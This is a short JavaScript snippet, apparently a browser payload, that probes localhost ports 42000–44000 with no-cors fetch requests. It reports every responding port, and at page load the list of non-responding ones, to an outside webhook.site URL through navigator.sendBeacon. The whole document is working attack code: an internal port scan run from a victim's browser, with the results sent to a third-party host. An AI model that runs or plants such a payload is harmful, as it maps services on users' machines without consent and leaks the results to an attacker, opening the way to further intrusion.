let checked = [];
window.addEventListener(
  'load',
  () => navigator.sendBeacon('https://webhook.site/a8cf716c-0668-4e17-947d-a712c8250c18?q=end', checked.toString())
);
const START = 42000;
const END = 44000;
Promise.all(Array.from({
  length: END - START
}, (_, i) => {
  i += START;
  return fetch('http://localhost:' + i, {
      mode: 'no-cors'
    })
    .then(() => navigator.sendBeacon('https://webhook.site/a8cf716c-0668-4e17-947d-a712c8250c18?p=' + i))
    //.then(() => fetch('https://webhook.site/a8cf716c-0668-4e17-947d-a712c8250c18?p=' + i, { mode: 'no-cors' }))
    .catch(() => checked.push(i))
}))
